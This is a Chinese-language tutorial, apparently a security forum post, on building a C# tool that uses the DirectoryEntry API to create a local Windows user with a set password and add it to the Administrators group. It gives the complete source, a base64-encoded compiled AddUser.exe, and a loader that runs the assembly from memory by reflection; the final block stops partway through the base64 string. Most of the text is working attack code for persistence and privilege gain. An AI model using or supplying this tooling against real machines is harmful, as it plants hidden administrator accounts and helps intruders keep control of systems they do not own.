DirectoryEntry类

```php
[System.ComponentModel.TypeConverter(typeof(System.DirectoryServices.Design.DirectoryEntryConverter))]
[System.DirectoryServices.DSDescription("DirectoryEntryDesc")]
public class DirectoryEntry : System.ComponentModel.Component
```

构造函数

```php
DirectoryEntry()    
初始化 DirectoryEntry 类的新实例。

DirectoryEntry(Object)  
初始化 DirectoryEntry 类的新实例，该类可绑定到指定的本机 Active Directory 域服务对象。

DirectoryEntry(String)  
初始化 DirectoryEntry 类的新实例，该类将此实例绑定到位于指定路径的 Active Directory 域服务中的节点。

DirectoryEntry(String, String, String)  
初始化 DirectoryEntry 类的新实例。

DirectoryEntry(String, String, String, AuthenticationTypes) 
初始化 DirectoryEntry 类的新实例。
```

这个一般是用来连接ad的，比如操作ldap数据库，进行查询域内信息，委派啊等等。我们可以传递参数为`WinNT://hostname,computer`，创建一个新的条目。

c#可以通过如下两种方式查看本机hostname。

```php
using System.Net;
string hostname = Dns.GetHostName();
Console.WriteLine(hostname);

string hostname1 = Environment.MachineName;
Console.WriteLine(hostname1);
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c876e2076e3ab711aed18ade98348e89cabd5348.png)

然后我们添加一个值给user到ad中。

```php
string hostname = Dns.GetHostName();
DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
string username = "testuseradd";
string password = "1qaz@WSX..";
DirectoryEntry user = DE.Children.Add(username, "user");
```

然后用DirectoryEntry类的Invoke方法调用SetPassword方法来添加密码。再通过CommitChanges()方法来进行保存刷新。

```php
user.Invoke("SetPassword", new object[] { password });
user.CommitChanges();
```

### 0x02 添加用户到管理员组

因为某些地区可能语言问题，管理员组名字不叫作administrator。所以我们可以先枚举一下目标本地组

```php
string hostname = Dns.GetHostName();
DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
DirectoryEntry group;
foreach(DirectoryEntry entry in DE.Children)
{
    if (entry.SchemaClassName == "Group")
    {
        Console.WriteLine(entry.Name);
    }
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c5c7ccc31d5b7f56fb511600e56f41a5172ec3fd.png)

如何添加到管理员组？  
首先定义一个`DirectoryEntry`类型的变量group。然后调用`DirectoryEntry`类的find方法找到`administrators`组，再通过Invoke添加上面创建的用户。

```php
DirectoryEntry group;
group = DE.Children.Find("Administrators", "group");
if (group != null) { group.Invoke("Add", new object[] { user.Path.ToString() }); }
```

完整代码

```php
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices;
using System.Net;

namespace AddUser
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string hostname = Dns.GetHostName();
            DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
            if (args.Length == 1 &amp;&amp; args[0] == "--list")
            {
                ListGroup(hostname,DE);
            }
            else if(args.Length == 6 &amp;&amp; args[0] == "-u" &amp;&amp; args[2] == "-p" &amp;&amp; args[4] == "-l")
            {
                string username = args[1];
                string password = args[3];
                string groupname = args[5];
                try
                {
                    Add(username, password, DE);
                }catch(Exception e)
                {
                    Console.WriteLine(e.Message);
                }                
            }
        }

        public static void ListGroup(string hostname,DirectoryEntry DE)
        {
            hostname = Dns.GetHostName();
            DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
            foreach (DirectoryEntry entry in DE.Children)
            {
                if (entry.SchemaClassName == "Group")
                {
                    Console.WriteLine(entry.Name);
                }
            }
        }

        public static void Add(string username,string password, DirectoryEntry DE)
        {
            DirectoryEntry user = DE.Children.Add(username, "user");
            user.Invoke("SetPassword", new object[] { password });
            user.CommitChanges();

            DirectoryEntry group;
            group = DE.Children.Find("Administrators", "group");
            if (group != null) { group.Invoke("Add", new object[] { user.Path.ToString() }); }
            Console.WriteLine("[*] Account Created Successfully");
            Console.WriteLine($"[+] Username: {username}\n[+] Password: {password}");
        }
    }
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-12a5eca5d0fdb08091645c53b5eda95563e19487.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-b8ea71931da7ac7e67e6bd65e929e242da7fab4f.png)

### 0x03 反射加载

首先在AddUser里面添加一个类，包含一下方法

```php
public class Test
{
    public static void ListGroup(string hostname, DirectoryEntry DE)
    {
        hostname = Dns.GetHostName();
        DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
        foreach (DirectoryEntry entry in DE.Children)
        {
            if (entry.SchemaClassName == "Group")
            {
                Console.WriteLine(entry.Name);
            }
        }
    }

    public static void Add(string username, string password, DirectoryEntry DE)
    {
        DirectoryEntry user = DE.Children.Add(username, "user");
        user.Invoke("SetPassword", new object[] { password });
        user.CommitChanges();

        DirectoryEntry group;
        group = DE.Children.Find("Administrators", "group");
        if (group != null) { group.Invoke("Add", new object[] { user.Path.ToString() }); }
        Console.WriteLine("[+]" + username + " Created Success");
        Console.WriteLine("[+]" + username + " add to group Success");
    }
}
```

先把exe转换为string

```php
byte[] buffer = File.ReadAllBytes("AddUser.exe");
string base64str = Convert.ToBase64String(buffer);
Console.WriteLine(base64str);
```

结果为

```php
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dEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQWRkVXNlci5leGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUb1N0cmluZwBnZXRfUGF0aABQcm9ncmFtAFN5c3RlbQBnZXRfQ2hpbGRyZW4ATWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBFeGNlcHRpb24ATGlzdEdyb3VwAEFkZFVzZXIASUVudW1lcmF0b3IAR2V0RW51bWVyYXRvcgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAENvbW1pdENoYW5nZXMARGlyZWN0b3J5RW50cmllcwBhcmdzAERucwBTeXN0ZW0uQ29sbGVjdGlvbnMAQ29uY2F0AE9iamVjdABTeXN0ZW0uTmV0AGdldF9DdXJyZW50AFRlc3QATW92ZU5leHQARGlyZWN0b3J5RW50cnkAb3BfRXF1YWxpdHkAAAARVwBpAG4ATgBUADoALwAvAAATLABjAG8AbQBwAHUAdABlAHIAAA0tAC0AbABpAHMAdAABBS0AdQABBS0AcAABC0cAcgBvAHUAcAAACXUAcwBlAHIAABdTAGUAdABQAGEAcwBzAHcAbwByAGQAAB1BAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAAAtnAHIAbwB1AHAAAAdBAGQAZAAAB1sAKwBdAAAhIABDAHIAZQBhAHQAZQBkACAAUwB1AGMAYwBlAHMAcwAAKyAAYQBkAGQAIAB0AG8AIABnAHIAbwB1AHAAIABTAHUAYwBjAGUAcwBzAAAAQ3REeVsMNk+j95CnDRvIGAAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBwcEDhJFDg4DAAAOBgADDg4ODgUAAgIODgMgAA4EAAEBDggHAxJNEkUSUQQgABJhBCAAEk0DIAAcAyAAAgYHAhJFEkUGIAISRQ4OBiACHA4dHAi3elxWGTTg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
```

在loader这边一样的获得机器名，和定义一个DirectoryEntry的变量

```php
string hostname = Dns.GetHostName();
DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
```

把string转换为byte类型，通过load方法加载

```php
byte[] buffer = Convert.FromBase64String(base64str);
Assembly assembly = Assembly.Load(buffer);
```

获得ListGroup方法，并且传参调用

```php
Type type = assembly.GetType("AddUser.Test");
MethodInfo method = type.GetMethod("ListGroup");
Object obj = assembly.CreateInstance(method.Name);
method.Invoke(obj, new object[] { hostname ,DE});
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1f22f8c9af6d02b5376381bb88f56bc04b70e0b9.png)

同理添加用户。

```php
string hostname = Dns.GetHostName();
DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
string base64str = "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